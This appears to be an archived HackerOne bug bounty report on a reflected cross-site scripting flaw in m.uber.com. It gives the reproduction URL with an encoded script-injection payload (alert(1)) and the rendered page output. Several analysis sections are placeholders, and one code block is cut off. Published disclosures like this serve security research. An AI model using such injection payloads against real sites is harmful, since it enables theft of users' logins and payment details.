# SSL-protected Reflected XSS in m.uber.com

## Metadata
- **Source:** HackerOne
- **Report:** 296701 | https://hackerone.com/reports/296701
- **Submitted:** 2017-12-10
- **Reporter:** gregoryvperry
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** critical
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
## Summary
m.uber.com is susceptible to reflected XSS

## Security Impact
A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com

## Reproduction Steps
https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1

## Specifics
From the rendered web page:
```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryP

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

## Summary
m.uber.com is susceptible to reflected XSS

## Security Impact
A malformed URL can be used to render arbitrary SSL-protected web pages from m.uber.com

## Reproduction Steps
https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1

## Specifics
From the rendered web page:
```
{"enabled":true,"sid":"bbc661585c424072","url":"www.cdn-net.com","cf":1022963},"queryParams":{"bjbxm</script><script>alert(1)</script>xrii5":"1"}
```
No further efforts were made to render a more believable webpage as the vulnerability and reflected code above is sufficient to trigger Chromium Browser's XSS _Auditor protections.

## Impact

An attacker could render arbitrary SSL-protected web pages from m.uber.com, to capture user login credentials and passwords, credit card numbers and related payment information, etc.

</details>

---
*Analysed by Claude on 2026-05-24*
